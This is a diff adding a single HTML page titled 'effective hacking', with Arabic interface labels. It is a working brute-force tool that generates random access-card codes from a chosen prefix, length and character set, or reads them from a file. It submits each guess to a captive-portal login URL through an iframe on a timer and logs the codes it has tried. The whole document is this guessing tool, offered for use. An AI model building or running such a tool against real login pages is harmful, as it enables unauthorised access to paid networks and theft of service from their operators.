@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>effective hacking</title>
+        <style>
+            body{
+                
+            }
+            #loginPageViewer{
+                width:100%;
+                height: 800px;
+            }
+            .toolsbox{
+                text-align: left;
+                font-weight: bold;
+                color:#999;
+
+            }
+            .toolsbox input{
+                width:300px;
+                height: 20px;
+                border:none;
+                background-color: rgb(144, 226, 181);
+                border-radius: 25px;
+                padding: 5px 10px;
+                margin-top: 5px;
+                display: block;
+                text-align: center;
+                font-weight: bold;
+
+
+
+}
+#dlink{
+    text-decoration: none;
+    color:black;
+    background-color: orange;
+    padding: 5px 10px;
+    visibility: hidden;
+    font-weight: bold;
+}
+.toolsbox button{
+min-width: 100px;
+height:30px;
+border: none;
+border-radius: 15px;
+padding: 5px 10px;
+font-weight: bold;
+
+}
+.toolsbox button:hover{
+    background-color: orange;
+}
+#currentUsername{
+    background-color: #eee;
+}
+
+
+
+        </style>
+    </head>
+    <body id="body">
+        <center><img src="youtube channel.PNG"></center>
+        <div class="toolsbox">
+            <a href="" id="dlink">حفظ في الملفات</a><br><br>
+            رابط صفحة تسجيل الدخول<input type="text" id="loginURL" value="http://z.net/login" /><br>
+            الرموز المكونة للكرت<input type="text" id="loginChars" value="0123456789" /><br>
+            عدد الرموز المكونة للكرت<input id="loginUsernameLength" value="10" /><br>
+            جزء بداية الكرت إذا كان ثابت<input type="text" id="loginUsernameFixed" value="9h" /><br>
+            عدد الكروت المطلوب تخمينها ومن ثم توقف<input id="loginCount" value="100" /><br>
+            msالزمن بين المحاولة والمحاولة<input id="loginTimeOut" value="1000" /><br>
+            <br>
+            <br>
+            <br>
+            <button onclick="usingFile()">إستخدم الكروت من ملف</button>
+            <button onclick="runProgram()">إبدأ</button>
+            <button onclick="stopProgram()">توقف</button>
+            <button onclick="saveFile()">حغظ الكروت التي تم تجريبها</button><br><br>
+            <progress id="prog" width="300" max="100"></progress><br>
+            <input id="currentUsername"><br>
+            <iframe src="" id="loginPageViewer"></iframe>
+        </div>
+    
+        
+<script>
+    var fileData=[1,2,3,4];
+    var isUsingFile=false;
+    var dataUsed=new Array();
+    var ref;
+    var counter=0;
+function getRandom(){
+               pwdLen=(loginUsernameLength.value)-loginUsernameFixed.value.length;
+               chars=loginChars.value.toString();
+               result=loginUsernameFixed.value.toString();
+               for(x=0;x<pwdLen;x++){
+                   result +=""+chars.charAt(Math.floor(Math.random()*chars.length));
+               }
+               lastPwd=result;
+               return result;
+               
+           } 
+function usingFile(){
+filename=prompt("input file path","");
+isUsingFile=true;
+sc=document.createElement("script");
+sc.src=filename;
+body.appendChild(sc);
+
+}
+function saveFile(){
+    filename=prompt("input file name to save","");
+    myjson=JSON.stringify(dataUsed);
+    text=encodeURIComponent("fileData="+myjson+";");
+    dlink.href="data:text/plain;charset=utf-8,"+text;
+    dlink.download=filename;
+    dlink.style.visibility="visible";
+}
+function stopProgram(){
+clearInterval(ref);
+}
+
+
+
+
+function runProgram(){
+    counter=0;
+if(isUsingFile){
+    
+    ref=setInterval(loginFromFile,parseInt(loginTimeOut.value));
+}
+else{
+    ref=setInterval(loginFromScript,parseInt(loginTimeOut.value));
+}
+
+}
+function loginFromFile(){
+if (counter<fileData.length){
+    cpwd=fileData[counter++];
+    loginPageViewer.src=loginURL.value+"?username="+cpwd;
+    currentUsername.value=cpwd;
+}else{
+    stopProgram();
+}
+}
+
+function loginFromScript(){
+    if (counter<parseInt(loginCount.value)){
+    cpwd=getRandom();
+    loginPageViewer.src=loginURL.value+"?username="+cpwd;
+   // alert(loginPageViewer.src);
+    currentUsername.value=cpwd;
+    dataUsed[dataUsed.length++]=cpwd;
+    prog.value=Math.floor((counter/loginCount.value)*100);
+    counter++;
+
+}else{
+    stopProgram();
+}
+
+
+}
+
+
+
+</script>
+
+
+    </body>
+</html>
